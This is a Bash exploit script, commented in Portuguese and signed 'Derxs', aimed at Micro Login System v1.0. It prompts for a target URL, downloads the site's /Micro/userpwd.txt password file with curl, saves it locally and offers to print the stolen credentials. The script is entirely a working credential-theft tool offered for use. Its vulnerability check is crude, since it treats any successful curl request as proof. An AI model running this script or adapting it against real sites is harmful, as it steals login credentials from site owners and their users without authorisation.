#!/bin/bash
# Script básico que explora uma em sistemas de login da Micro Login System v 1.0
echo "
 __  __      ____  _       _ _
|  \/  |_  _|  _ \| | ___ (_) |_
| |\/| \ \/ / |_) | |/ _ \| | __|
| |  | |>  <|  __/| | (_) | | |_
|_|  |_/_/\_\_|   |_|\___/|_|\__|

	By: Derxs
"
echo ""
echo -n "URL: "
read site
curl $site/Micro/userpwd.txt > pass.txt
if [ $? = 0 ]
then
	echo "O site é vulnerável!"
	echo -n "Deseja continuar [s/n]? "
	read cont
	case $cont in
		S | s)echo "";cat pass.txt;echo "";;
		N | n)rm pass.txt;exit;;
		    *)echo "Opção inválida!"; sleep 2; exit;;
	esac
else
	echo "O site não é vulnerável!"
	exit
fi
